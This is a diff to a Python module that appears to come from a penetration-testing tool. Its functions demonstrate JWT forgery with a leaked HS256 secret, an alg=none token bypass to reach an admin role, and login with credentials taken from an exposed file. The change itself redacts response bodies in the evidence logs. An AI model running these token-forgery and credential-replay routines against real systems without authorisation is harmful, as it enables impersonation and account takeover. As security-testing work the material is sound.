@@ -101,7 +101,7 @@ def walk_secret_to_identity(h, exposure, endpoint, claims=None):
         tok = sign_hs256(claims, secret)
         rr = h.req(endpoint, headers={"Authorization": f"Bearer {tok}"})
         steps.append({"step": f"present a token signed with {name}", "status": rr["code"],
-                      "detail": rr["body"][:160]})
+                      "detail": f"response body {len(rr.get('body') or '')} bytes"})
         if rr["code"] == 200:
             accepted, token_used = rr, (name, secret, tok)
             break
@@ -134,7 +134,7 @@ def walk_secret_to_identity(h, exposure, endpoint, claims=None):
                     f"The endpoint accepted it. The exposure is not information disclosure "
                     f"— it is identity forgery."),
         "evidence": f"token signed with leaked {name} accepted at {endpoint}: HTTP "
-                    f"{accepted['code']}, body {body[:200]}",
+                    f"{accepted['code']}, response body {len(body)} bytes",
         "secret_name": name,
         "note": "The secret value is deliberately not reproduced here. It is in the "
                 "engagement evidence if it is needed for remediation proof.",
@@ -174,7 +174,9 @@ def walk_credentials_to_session(h, exposure, login_path, user_field="username",
                    else "application/x-www-form-urlencoded"}
             rr = h.req(login_path, "POST", payload, headers=hdr)
             steps.append({"step": f"attempt login as {uname} with {pname}",
-                          "status": rr["code"], "detail": rr["body"][:120]})
+                          "status": rr["code"],
+                          "detail": f"response body {len(rr.get('body') or '')} bytes; "
+                                    f"Set-Cookie={'present' if rr.get('headers', {}).get('Set-Cookie') else 'absent'}"})
             if rr["code"] == 200 and rr["headers"].get("Set-Cookie"):
                 return {"verdict": "DEMONSTRATED", "steps": steps,
                         "summary": f"Credentials read from the exposed file authenticated "
@@ -227,7 +229,8 @@ def walk_alg_none_to_admin(h, finding, endpoint, claims=None,
     # 3. Present it.
     r = h.req(probe_path, headers={"Authorization": f"Bearer {token}"})
     steps.append({"step": f"call {probe_path} with the forged token", "status": r["code"],
-                  "detail": (r["body"] or "")[:160]})
+                  "detail": f"granted role={claims.get('role')}; response body "
+                            f"{len(r.get('body') or '')} bytes"})
     if r["code"] != 200:
         return {"verdict": "NOT_DEMONSTRATED", "steps": steps,
                 "reason": f"the endpoint refused the forged token (HTTP {r['code']}) — the "
